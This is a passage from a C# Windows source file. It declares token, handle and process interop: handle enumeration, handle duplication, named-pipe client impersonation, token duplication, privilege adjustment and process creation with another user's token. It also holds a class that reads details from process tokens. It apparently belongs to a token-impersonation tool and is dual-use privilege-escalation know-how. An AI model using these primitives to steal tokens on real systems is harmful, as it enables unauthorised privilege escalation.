ProcessExceptionPort,\n        ProcessAccessToken,\n        ProcessLdtInformation,\n        ProcessLdtSize,\n        ProcessDefaultHardErrorMode,\n        ProcessIoPortHandlers,\n        ProcessPooledUsageAndLimits,\n        ProcessWorkingSetWatch,\n        ProcessUserModeIOPL,\n        ProcessEnableAlignmentFaultFixup,\n        ProcessPriorityClass,\n        ProcessWx86Information,\n        ProcessHandleCount,\n        ProcessAffinityMask,\n        ProcessPriorityBoost,\n        MaxProcessInfoClass\n\n\n    }\n\n    [Flags]\n    public enum ProcessAccessFlags : uint\n    {\n        All = 0x001F0FFF,\n        Terminate = 0x00000001,\n        CreateThread = 0x00000002,\n        VirtualMemoryOperation = 0x00000008,\n        VirtualMemoryRead = 0x00000010,\n        VirtualMemoryWrite = 0x00000020,\n        DuplicateHandle = 0x00000040,\n        CreateProcess = 0x000000080,\n        SetQuota = 0x00000100,\n        SetInformation = 0x00000200,\n        QueryInformation = 0x00000400,\n        QueryLimitedInformation = 0x00001000,\n        Synchronize = 0x00100000\n    }\n    public enum TOKEN_ELEVATION_TYPE\n    {\n        TokenElevationTypeDefault = 1,\n        TokenElevationTypeFull,\n        TokenElevationTypeLimited\n    }\n    public enum TOKEN_INFORMATION_CLASS\n    {\n        TokenUser = 1,\n        TokenGroups,\n        TokenPrivileges,\n        TokenOwner,\n        TokenPrimaryGroup,\n        TokenDefaultDacl,\n        TokenSource,\n        TokenType,\n        TokenImpersonationLevel,\n        TokenStatistics,\n        TokenRestrictedSids,\n        TokenSessionId,\n        TokenGroupsAndPrivileges,\n        TokenSessionReference,\n        TokenSandBoxInert,\n        TokenAuditPolicy,\n        TokenOrigin,\n        TokenElevationType,\n        TokenLinkedToken,\n        TokenElevation,\n        TokenHasRestrictions,\n        TokenAccessInformation,\n        TokenVirtualizationAllowed,\n        TokenVirtualizationEnabled,\n        TokenIntegrityLevel,\n        TokenUIAccess,\n        TokenMandatoryPolicy,\n        TokenLogonSid,\n        TokenIsAppContainer,\n        TokenCapabilities,\n        TokenAppContainerSid,\n        TokenAppContainerNumber,\n        TokenUserClaimAttributes,\n        TokenDeviceClaimAttributes,\n        TokenRestrictedUserClaimAttributes,\n        TokenRestrictedDeviceClaimAttributes,\n        TokenDeviceGroups,\n        TokenRestrictedDeviceGroups,\n        TokenSecurityAttributes,\n        TokenIsRestricted,\n        TokenProcessTrustLevel,\n        TokenPrivateNameSpace,\n        TokenSingletonAttributes,\n        TokenBnoIsolation,\n        TokenChildProcessFlags,\n        TokenIsLessPrivilegedAppContainer,\n        TokenIsSandboxed,\n        MaxTokenInfoClass\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct LUID\n    {\n        public int LowPart;\n\n        public int HighPart;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public class TokenPrivileges\n    {\n        public int PrivilegeCount = 1;\n\n        public LUID Luid;\n\n        public int Attributes;\n    }\n    public enum SECURITY_LOGON_TYPE : uint\n    {\n        UndefinedLogonType = 0,\n        Interactive = 2,\n        Network,\n        Batch,\n        Service,\n        Proxy,\n        Unlock,\n        NetworkCleartext,\n        NewCredentials,\n        RemoteInteractive,\n        CachedInteractive,\n        CachedRemoteInteractive,\n        CachedUnlock\n    }\n    public enum TOKEN_TYPE\n    {\n        UnKnown = -1,\n        TokenPrimary = 1,\n        TokenImpersonation\n    }\n    public enum OBJECT_INFORMATION_CLASS\n    {\n        ObjectBasicInformation,\n        ObjectNameInformation,\n        ObjectTypeInformation,\n        ObjectAllTypesInformation,\n        ObjectHandleInformation\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct OBJECT_TYPE_INFORMATION\n    { // Information Class 2\n        public UNICODE_STRING Name;\n        public int ObjectCount;\n        public int HandleCount;\n        public int Reserved1;\n        public int Reserved2;\n        public int Reserved3;\n        public int Reserved4;\n        public int PeakObjectCount;\n        public int PeakHandleCount;\n        public int Reserved5;\n        public int Reserved6;\n        public int Reserved7;\n        public int Reserved8;\n        public int InvalidAttributes;\n        public GENERIC_MAPPING GenericMapping;\n        public int ValidAccess;\n        public byte Unknown;\n        public byte MaintainHandleDatabase;\n        public int PoolType;\n        public int PagedPoolUsage;\n        public int NonPagedPoolUsage;\n    }\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct SECURITY_LOGON_SESSION_DATA\n    {\n        public uint Size;\n\n        public LUID LogonId;\n\n        public UNICODE_STRING UserName;\n\n        public UNICODE_STRING LogonDomain;\n\n        public UNICODE_STRING AuthenticationPackage;\n\n        public uint LogonType;\n\n        public uint Session;\n\n        public IntPtr Sid;\n\n        public long LogonTime;\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct GENERIC_MAPPING\n    {\n        public int GenericRead;\n        public int GenericWrite;\n        public int GenericExecute;\n        public int GenericAll;\n    }\n    public class NativeMethod\n    {\n        public static readonly uint HANDLE_FLAG_INHERIT = 0x00000001;\n        public static readonly uint HANDLE_FLAG_PROTECT_FROM_CLOSE = 0x00000002;\n        public static readonly uint SystemExtendedHandleInformation = 0x40;\n        public static readonly uint STATUS_SUCCESS = 0x00000000;\n        public static readonly uint ERROR_SUCCESS = 0x00000000;\n        public static readonly uint STATUS_INFO_LENGTH_MISMATCH = 0xc0000004;\n        public static readonly uint STATUS_BUFFER_OVERFLOW = 0x80000005;\n        public static readonly uint DUPLICATE_SAME_ACCESS = 0x00000002;\n        public static readonly uint MAXIMUM_ALLOWED = 0x02000000;\n        public static uint STANDARD_RIGHTS_REQUIRED = 0x000F0000;\n        public static uint TOKEN_ASSIGN_PRIMARY = 0x0001;\n        public static uint TOKEN_DUPLICATE = 0x0002;\n        public static uint TOKEN_IMPERSONATE = 0x0004;\n        public static uint TOKEN_QUERY = 0x0008;\n        public static uint TOKEN_QUERY_SOURCE = 0x0010;\n        public static uint TOKEN_ADJUST_PRIVILEGES = 0x0020;\n        public static uint TOKEN_ADJUST_GROUPS = 0x0040;\n        public static uint TOKEN_ADJUST_DEFAULT = 0x0080;\n        public static uint TOKEN_ADJUST_SESSIONID = 0x0100;\n\n        public static uint STARTF_FORCEONFEEDBACK = 0x00000040;\n        public static uint STARTF_FORCEOFFFEEDBACK = 0x00000080;\n        public static uint STARTF_PREVENTPINNING = 0x00002000;\n        public static uint STARTF_RUNFULLSCREEN = 0x00000020;\n        public static uint STARTF_TITLEISAPPID = 0x00001000;\n        public static uint STARTF_TITLEISLINKNAME = 0x00000800;\n        public static uint STARTF_UNTRUSTEDSOURCE = 0x00008000;\n        public static uint STARTF_USECOUNTCHARS = 0x00000008;\n        public static uint STARTF_USEFILLATTRIBUTE = 0x00000010;\n        public static uint STARTF_USEHOTKEY = 0x00000200;\n        public static uint STARTF_USEPOSITION = 0x00000004;\n        public static uint STARTF_USESHOWWINDOW = 0x00000001;\n        public static uint STARTF_USESIZE = 0x00000002;\n        public static uint STARTF_USESTDHANDLES = 0x00000100;\n\n\n\n        public static uint GENERIC_READ = 0x80000000;\n        public static uint GENERIC_WRITE = 0x40000000;\n        public static uint GENERIC_EXECUTE = 0x20000000;\n        public static uint GENERIC_ALL = 0x10000000;\n\n\n\n\n\n        public static uint TOKEN_ELEVATION = TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID;\n        public static uint TOKEN_ALL_ACCESS_P = STANDARD_RIGHTS_REQUIRED |\n                          TOKEN_ASSIGN_PRIMARY |\n                          TOKEN_DUPLICATE |\n                          TOKEN_IMPERSONATE |\n                          TOKEN_QUERY |\n                          TOKEN_QUERY_SOURCE |\n                          TOKEN_ADJUST_PRIVILEGES |\n                          TOKEN_ADJUST_GROUPS |\n                          TOKEN_ADJUST_DEFAULT;\n\n\n        public static readonly int SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001;\n        public static readonly int SE_PRIVILEGE_ENABLED = 0x00000002;\n        public static readonly int SE_PRIVILEGE_REMOVED = 0X00000004;\n\n        public static readonly int NMPWAIT_WAIT_FOREVER = unchecked((int)0xffffffff);\n        public static readonly int NMPWAIT_NOWAIT = 0x00000001;\n        public static readonly int NMPWAIT_USE_DEFAULT_WAIT = 0x00000000;\n\n        public static readonly int PIPE_UNLIMITED_INSTANCES = 255;\n\n        public static readonly int PIPE_WAIT = 0x00000000;\n        public static readonly int PIPE_NOWAIT = 0x00000001;\n        public static readonly int PIPE_READMODE_BYTE = 0x00000000;\n        public static readonly int PIPE_READMODE_MESSAGE = 0x00000002;\n        public static readonly int PIPE_TYPE_BYTE = 0x00000000;\n        public static readonly int PIPE_TYPE_MESSAGE = 0x00000004;\n        public static readonly int PIPE_ACCEPT_REMOTE_CLIENTS = 0x00000000;\n        public static readonly int PIPE_REJECT_REMOTE_CLIENTS = 0x00000008;\n\n        public static readonly int PIPE_ACCESS_INBOUND = 0x00000001;\n        public static readonly int PIPE_ACCESS_OUTBOUND = 0x00000002;\n        public static readonly int PIPE_ACCESS_DUPLEX = 0x00000003;\n\n        public static IntPtr ContextToken = IntPtr.Zero;\n\n        public static IntPtr BAD_HANLE = new IntPtr(-1);\n\n        [DllImport(\"ntdll\")]\n        public static extern uint NtQuerySystemInformation(\n        [In] uint SystemInformationClass,\n        [In] IntPtr SystemInformation,\n        [In] uint SystemInformationLength,\n        [Out] out uint ReturnLength);\n        [DllImport(\"ntdll\")]\n        public static extern uint NtDuplicateObject(\n        [In] IntPtr SourceProcessHandle,\n        [In] IntPtr SourceHandle,\n        [In] IntPtr TargetProcessHandle,\n        [In] IntPtr PHANDLE,\n        [In] int DesiredAccess,\n        [In] int Attributes,\n        [In] int Options);\n\n        [DllImport(\"ntdll\", SetLastError = true)]\n        public static extern uint NtQueryObject(\n        [In] IntPtr Handle,\n        [In] OBJECT_INFORMATION_CLASS ObjectInformationClass,\n        IntPtr ObjectInformation,\n        [In] int ObjectInformationLength,\n        out int ReturnLength);\n        [DllImport(\"ntdll\", SetLastError = true)]\n        public static extern uint NtSuspendProcess([In] IntPtr Handle);\n\n        [DllImport(\"ntdll.dll\", SetLastError = false)]\n        public static extern uint NtResumeProcess(IntPtr ProcessHandle);\n\n        [DllImport(\"ntdll\", SetLastError = true)]\n        public static extern uint NtTerminateProcess(\n  [In] IntPtr ProcessHandle,\n  [In] uint ExitStatus);\n\n\n\n        [DllImport(\"ntdll\", SetLastError = true)]\n        public static extern uint NtSetInformationProcess(\n\n  [In] IntPtr ProcessHandle,\n  [In] PROCESS_INFORMATION_CLASS ProcessInformationClass,\n  [In] IntPtr ProcessInformation,\n  [In] uint ProcessInformationLength);\n\n        [ReliabilityContract(Consistency.WillNotCorruptState, Cer.Success)]\n        [DllImport(\"secur32.dll\", SetLastError = true)]\n        internal static extern int LsaFreeReturnBuffer(IntPtr handle);\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern bool PeekNamedPipe(IntPtr handle,\n            byte[] buffer, uint nBufferSize, ref uint bytesRead,\n            ref uint bytesAvail, ref uint BytesLeftThisMessage);\n\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        public static extern IntPtr GetSidSubAuthority(IntPtr pSid, uint nSubAuthority);\n\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        public static extern IntPtr GetSidSubAuthorityCount(IntPtr pSid);\n\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool IsTokenRestricted(IntPtr TokenHandle);\n        [DllImport(\"kernel32\")]\n        public static extern void CloseHandle(IntPtr hObject);\n        [DllImport(\"kernel32\")]\n        public static extern IntPtr GetCurrentProcess();\n        [DllImport(\"kernel32\")]\n        public static extern void SetLastError(uint dwErrCode);\n        [DllImport(\"kernel32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, int nSize);\n        [DllImport(\"kernel32.dll\", CharSet = CharSet.Unicode, SetLastError = true)]\n        public static extern bool CreateProcessW([In] string lpApplicationName, [In][Out] string lpCommandLine, [In] IntPtr lpProcessAttributes, [In] IntPtr lpThreadAttributes, [In] bool bInheritHandles, [In] uint dwCreationFlags, [In] IntPtr lpEnvironment, [In] string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, [Out] out PROCESS_INFORMATION lpProcessInformation);\n        [DllImport(\"advapi32\", SetLastError = true, CharSet = CharSet.Unicode)]\n        public static extern bool CreateProcessAsUserW(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, [MarshalAs(UnmanagedType.LPWStr)] string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n        [DllImport(\"advapi32\", SetLastError = true, CharSet = CharSet.Unicode)]\n        public static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);\n        [DllImport(\"advapi32\", SetLastError = true)]\n        public static extern bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, uint TokenInformationLength, out uint ReturnLength);\n        [DllImport(\"Kernel32\", SetLastError = true)]\n        public static extern bool SetHandleInformation(IntPtr TokenHandle, uint dwMask, uint dwFlags);\n\n        [DllImport(\"wtsapi32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern int WTSConnectSession(int targetSessionId, int sourceSessionId, string password, bool wait);\n\n        [DllImport(\"kernel32.dll\")]\n        public static extern int WTSGetActiveConsoleSessionId();\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern IntPtr OpenProcess(\n        ProcessAccessFlags processAccess, bool bInheritHandle, int processId);\n\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        public static extern bool DuplicateHandle(\n  [In] IntPtr hSourceProcessHandle,\n  [In] IntPtr hSourceHandle,\n  [In] IntPtr hTargetProcessHandle,\n  out IntPtr lpTargetHandle,\n  [In] uint dwDesiredAccess,\n  [In] bool bInheritHandle,\n  [In] uint dwOptions\n);\n        [DllImport(\"secur32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        internal static extern uint LsaGetLogonSessionData([In] ref LUID LogonId, [In][Out] ref IntPtr ppLogonSessionData);\n        [DllImport(\"advapi32.dll\", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern bool LookupPrivilegeValue([MarshalAs(UnmanagedType.LPTStr)] string lpSystemName, [MarshalAs(UnmanagedType.LPTStr)] string lpName, out LUID lpLuid);\n        [DllImport(\"advapi32.dll\", CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, TokenPrivileges NewState, int BufferLength, IntPtr PreviousState, out int ReturnLength);\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool OpenProcessToken(IntPtr ProcessHandle, UInt32 DesiredAccess, out IntPtr TokenHandle);\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);\n        [DllImport(\"advapi32.dll\", SetLastError = true, EntryPoint = \"RevertToSelf\")]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool RevertToSelfEx();\n        [DllImport(\"kernel32.dll\", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = \"CreateNamedPipeW\", SetLastError = true)]\n        public static extern IntPtr CreateNamedPipe(string pipeName, int openMode, int pipeMode, int maxInstances, int outBufferSize, int inBufferSize, int defaultTimeout, ref SECURITY_ATTRIBUTES securityAttributes);\n        [DllImport(\"kernel32.dll\", BestFitMapping = false, CharSet = CharSet.Unicode, EntryPoint = \"CreateFileW\", SetLastError = true)]\n        public static extern IntPtr CreateFileW(string lpFileName, int dwDesiredAccess, FileShare dwShareMode, ref SECURITY_ATTRIBUTES secAttrs, FileMode dwCreationDisposition, int dwFlagsAndAttributes, IntPtr hTemplateFile);\n        [DllImport(\"kernel32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool ConnectNamedPipe(IntPtr handle, IntPtr overlapped);\n        [DllImport(\"advapi32.dll\", SetLastError = true)]\n        [return: MarshalAs(UnmanagedType.Bool)]\n        public static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);\n        [DllImport(\"psapi.dll\", BestFitMapping = false, CharSet = CharSet.Auto, SetLastError = true)]\n        public static extern int GetModuleFileNameEx(IntPtr processHandle, IntPtr moduleHandle, StringBuilder baseName, int size);\n\n        [DllImport(\"advapi32.dll\", CharSet = CharSet.Auto, SetLastError = true, EntryPoint = \"DuplicateTokenEx\")]\n        private extern static bool DuplicateTokenExInternal(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);\n        public static bool GetTokenInformation(IntPtr tokenHandle, TOKEN_INFORMATION_CLASS tokenInformationClass, out IntPtr TokenInformation, out uint dwLength)\n        {\n\n            bool status = GetTokenInformation(tokenHandle, tokenInformationClass, IntPtr.Zero, 0, out dwLength);\n\n            if (dwLength == 0xfffffff8)\n            {\n                dwLength = 0;\n                goto failRet;\n            }\n\n            TokenInformation = Marshal.AllocHGlobal((int)dwLength);\n            if (GetTokenInformation(tokenHandle, tokenInformationClass, TokenInformation, dwLength, out dwLength))\n            {\n                return true;\n            }\n        failRet:\n            dwLength = 0;\n            TokenInformation = IntPtr.Zero;\n            return false;\n        }\n\n        public static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess,\n            IntPtr lpTokenAttributes, TokenImpersonationLevel impersonationLevel, TOKEN_TYPE TokenType,\n            out IntPtr phNewToken)\n        {\n            impersonationLevel -= TokenImpersonationLevel.Anonymous;\n            return DuplicateTokenExInternal(hExistingToken, dwDesiredAccess, lpTokenAttributes, (uint)impersonationLevel,\n                 TokenType, out phNewToken);\n        }\n\n        public static bool RevertToSelf()\n        {\n            bool isOk = RevertToSelfEx();\n            if (ContextToken != IntPtr.Zero)\n            {\n                isOk = ImpersonateLoggedOnUser(ContextToken);\n            }\n\n            return isOk;\n        }\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct TOKEN_STATISTICS\n    {\n\n        public LUID TokenId;\n\n        public LUID AuthenticationId;\n\n        public long ExpirationTime;\n\n        public uint TokenType;\n\n        public uint ImpersonationLevel;\n\n        public uint DynamicCharged;\n\n        public uint DynamicAvailable;\n\n        public uint GroupCount;\n\n        public uint PrivilegeCount;\n\n        public LUID ModifiedId;\n    }\n\n    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]\n    public struct STARTUPINFO\n    {\n        public Int32 cb;\n        public string lpReserved;\n        public string lpDesktop;\n        public string lpTitle;\n        public Int32 dwX;\n        public Int32 dwY;\n        public Int32 dwXSize;\n        public Int32 dwYSize;\n        public Int32 dwXCountChars;\n        public Int32 dwYCountChars;\n        public Int32 dwFillAttribute;\n        public Int32 dwFlags;\n        public Int16 wShowWindow;\n        public Int16 cbReserved2;\n        public IntPtr lpReserved2;\n        public IntPtr hStdInput;\n        public IntPtr hStdOutput;\n        public IntPtr hStdError;\n    }\n    [StructLayout(LayoutKind.Sequential)]\n    public struct PROCESS_INFORMATION\n    {\n        public IntPtr hProcess;\n        public IntPtr hThread;\n        public int dwProcessId;\n        public int dwThreadId;\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct _SYSTEM_HANDLE_INFORMATION_EX\n    {\n        private static int TypeSize = Marshal.SizeOf(typeof(_SYSTEM_HANDLE_INFORMATION_EX));\n        public IntPtr NumberOfHandles;\n        public IntPtr Reserved;\n\n\n        public uint GetNumberOfHandles()\n        {\n            return (uint)NumberOfHandles.ToInt64();\n        }\n        public static SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX HandleAt(IntPtr handleInfoPtr, ulong index)\n        {\n            IntPtr thisPtr = new IntPtr(handleInfoPtr.ToInt64());\n            thisPtr = new IntPtr(thisPtr.ToInt64() + TypeSize + Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)) * (int)index);\n\n            return (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(thisPtr, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));\n\n        }\n    }\n\n    [StructLayout(LayoutKind.Sequential)]\n    public struct UNICODE_STRING : IDisposable\n    {\n        public ushort Length;\n        public ushort MaximumLength;\n        public IntPtr buffer;\n\n        [SecurityPermission(SecurityAction.LinkDemand)]\n        public void Initialize(string s)\n        {\n            Length = (ushort)(s.Length * 2);\n            MaximumLength = (ushort)(Length + 2);\n            buffer = Marshal.StringToHGlobalUni(s);\n        }\n\n        [SecurityPermission(SecurityAction.LinkDemand)]\n        public void Dispose()\n        {\n            Marshal.FreeHGlobal(buffer);\n            buffer = IntPtr.Zero;\n        }\n        [SecurityPermission(SecurityAction.LinkDemand)]\n        public override string ToString()\n        {\n            if (Length == 0)\n                return String.Empty;\n            return Marshal.PtrToStringUni(buffer, Length / 2);\n        }\n    }\n\n    public class ProcessToken\n    {\n        public string SID { get; set; }\n        public string LogonDomain { get; set; }\n        public string UserName { get; set; }\n        public uint Session { get; set; }\n        public SECURITY_LOGON_TYPE LogonType { get; set; }\n        public TOKEN_TYPE TokenType { get; set; }\n        public IntPtr TokenHandle { get; set; }\n        public int TargetProcessId { get; set; }\n        public IntPtr TargetProcessToken { get; set; }\n        public TokenImpersonationLevel ImpersonationLevel { get; set; }\n        public string AuthenticationType { get; set; }\n        public string TargetProcessExePath { get; set; }\n        public TOKEN_ELEVATION_TYPE TokenElevationType { get; set; }\n        public IntegrityLevel IntegrityLevel { get; set; }\n        public bool IsRestricted { get; set; }\n        public bool TokenUIAccess { get; set; }\n\n        public string Groups { get; set; }\n\n        public bool IsClose { get; private set; }\n\n        private static readonly List<string> blackGroupSid = new List<string>();\n\n        private ProcessToken()\n        {\n\n        }\n\n\n        public static ProcessToken Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)\n        {\n            try\n            {\n                return _Cast(targetProcessToken, targetProcessPid, targetProcessHandle, tokenHandle);\n            }\n            catch (Exception)\n            {\n\n                return null;\n            }\n\n        }\n        private static ProcessToken _Cast(IntPtr targetProcessToken, int targetProcessPid, IntPtr targetProcessHandle, IntPtr tokenHandle)\n        {\n            ProcessToken processToken = new ProcessToken();\n            SecurityIdentifier securityIdentifier = GetUser(tokenHandle);\n\n            if (securityIdentifier == null)\n            {\n                return null;\n            }\n\n            processToken.UserName = securityIdentifier.Translate(typeof(NTAccount)).Value;\n            processToken.SID = securityIdentifier.Value;\n            processToken.Groups = string.Join(\",\", getGoups(tokenHandle));\n            processToken.ImpersonationLevel = GetImpersonationLevel(tokenHandle);\n            uint session = 0;\n            SECURITY_LOGON_TYPE logonType = SECURITY_LOGON_TYPE.UndefinedLogonType;\n            string logonDomain = \"\";\n\n            processToken.AuthenticationType = GetAuthenticationType(tokenHandle, out session, out logonDomain, out logonType);\n            processToken.Session = session;\n            processToken.LogonType = logonType;\n            processToken.LogonDomain = logonDomain;\n\n            processToken.TargetProcessId = targetProcessPid;\n            processToken.TargetProcessToken = targetProcessToken;\n\n            //获取Token类型\n            processToken.TokenType = GetTokenType(tokenHandle);\n\n            //检查token类型是否为主Token 如果是主Token必须调用DuplicateTokenEx获取模拟Token不然就获取不到Token类型 详情:https://docs.microsoft.com/en-us/windows/win32/api/winnt/ne-winnt-token_information_class\n            if (processToken.ImpersonationLevel == TokenImpersonationLevel.None)\n            {\n                IntPtr newToken;\n                if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero,\n                        TokenImpersonationLevel.Delegation, TOKEN_TYPE.TokenImpersonation, out newToken))\n                {\n                    processToken.ImpersonationLevel = TokenImpersonationLevel.Delegation;\n                    NativeMethod.CloseHandle(newToken);\n                }\n                else if (NativeMethod.DuplicateTokenEx(tokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero,\n                    TokenImpersonationLevel.Impersonation, TOKEN_TYPE.TokenImpersonation, out newToken))\n                {\n                    processToken.ImpersonationLevel = TokenImpersonationLevel.Impersonation;\n                    NativeMethod.CloseHandle(newToken);\n                }\n            }\n\n            processToken.TokenElevationType = GetTokenElevationType(tokenHandle);\n            processToken.IntegrityLevel = GetTokenIntegrityLevel(tokenHandle);\n            processToken.IsRestricted = NativeMethod.IsTokenRestricted(tokenHandle);\n            processToken.TokenUIAccess = GetTokenUIAccess(tokenHandle);\n            if (targetProcessHandle != IntPtr.Zero)\n            {\n                StringBuilder exePath = new StringBuilder(1024);\n                NativeMethod.GetModuleFileNameEx(targetProcessHandle, IntPtr.Zero, exePath, exePath.Capacity * 2);\n                processToken.TargetProcessExePath = exePath.ToString();\n            }\n\n            processToken.TokenHandle = tokenHandle;\n            return processToken;\n        }\n\n        public static SecurityIdentifier GetUser(IntPtr tokenHandle)\n        {\n            uint ReturnLength;\n            IntPtr tokenUserPtr = IntPtr.Zero;\n            SecurityIdentifier securityIdentifier = null;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUser, out tokenUserPtr, out ReturnLength))\n            {\n                securityIdentifier = new SecurityIdentifier(Marshal.ReadIntPtr(tokenUserPtr));\n                Marshal.FreeHGlobal(tokenUserPtr);\n            }\n            return securityIdentifier;\n        }\n\n        public static string[] getGoups(IntPtr tokenHandle)\n        {\n            List<string> goups = new List<string>();\n            IntPtr tokenUserPtr = IntPtr.Zero;\n            SecurityIdentifier securityIdentifier = null;\n            uint ReturnLength;\n            /**\n             *\n             * typedef struct _TOKEN_GROUPS {\n                DWORD GroupCount;\n            #ifdef MIDL_PASS\n                [size_is(GroupCount)] SID_AND_ATTRIBUTES Groups[*];\n            #else // MIDL_PASS\n                SID_AND_ATTRIBUTES Groups[ANYSIZE_ARRAY];\n            #endif // MIDL_PASS\n            } TOKEN_GROUPS, *PTOKEN_GROUPS;\n             *\n             */\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenGroups, out tokenUserPtr, out ReturnLength))\n            {\n                int offset = 0;\n                int groupCount = Marshal.ReadInt32(tokenUserPtr);\n                offset += Marshal.SizeOf(typeof(TOKEN_GROUPS)) - Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));\n\n                for (int i = 0; i < groupCount; i++)\n                {\n                    lock (blackGroupSid)\n                    {\n                        try\n                        {\n                            securityIdentifier = new SecurityIdentifier(Marshal.ReadIntPtr(new IntPtr(tokenUserPtr.ToInt64() + offset)));\n                            offset += Marshal.SizeOf(typeof(SID_AND_ATTRIBUTES));\n\n                            if (blackGroupSid.Contains(securityIdentifier.Value))\n                            {\n                                continue;\n                            }\n\n                            goups.Add(securityIdentifier.Translate(typeof(NTAccount)).Value);\n                        }\n                        catch (Exception e)\n                        {\n                            if (securityIdentifier != null)\n                            {\n                                blackGroupSid.Add(securityIdentifier.Value);\n                            }\n\n                            continue;\n                        }\n                    }\n                }\n                Marshal.FreeHGlobal(tokenUserPtr);\n            }\n            return goups.ToArray();\n        }\n\n        public static TOKEN_TYPE GetTokenType(IntPtr tokenHandle)\n        {\n            IntPtr tokenTypePtr = IntPtr.Zero;\n            uint outLength = 0;\n            TOKEN_TYPE ret = TOKEN_TYPE.UnKnown;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenType, out tokenTypePtr, out outLength))\n            {\n                ret = (TOKEN_TYPE)(int)Marshal.PtrToStructure(tokenTypePtr, typeof(int));\n                Marshal.FreeHGlobal(tokenTypePtr);\n            }\n            return ret;\n        }\n        public static TOKEN_ELEVATION_TYPE GetTokenElevationType(IntPtr tokenHandle)\n        {\n            IntPtr tokenInfo = IntPtr.Zero;\n            uint dwLength;\n            int num = -1;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevationType, out tokenInfo, out dwLength))\n            {\n                num = Marshal.ReadInt32(tokenInfo);\n                Marshal.FreeHGlobal(tokenInfo);\n\n            }\n            return (TOKEN_ELEVATION_TYPE)Enum.ToObject(typeof(TOKEN_ELEVATION_TYPE), num);\n        }\n        public static TokenImpersonationLevel GetImpersonationLevel(IntPtr tokenHandle)\n        {\n            IntPtr tokenInfo = IntPtr.Zero;\n            uint dwLength = 0;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, out tokenInfo, out dwLength))\n            {\n                int num = Marshal.ReadInt32(tokenInfo);\n                Marshal.FreeHGlobal(tokenInfo);\n                return num + TokenImpersonationLevel.Anonymous;\n            }\n            return TokenImpersonationLevel.None;\n        }\n        public static string GetAuthenticationType(IntPtr tokenHandle, out uint sessionId, out string logonDomain, out SECURITY_LOGON_TYPE logonType)\n        {\n            IntPtr tokenInfo = IntPtr.Zero;\n            uint dwLength = 0;\n            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenStatistics, out tokenInfo, out dwLength))\n            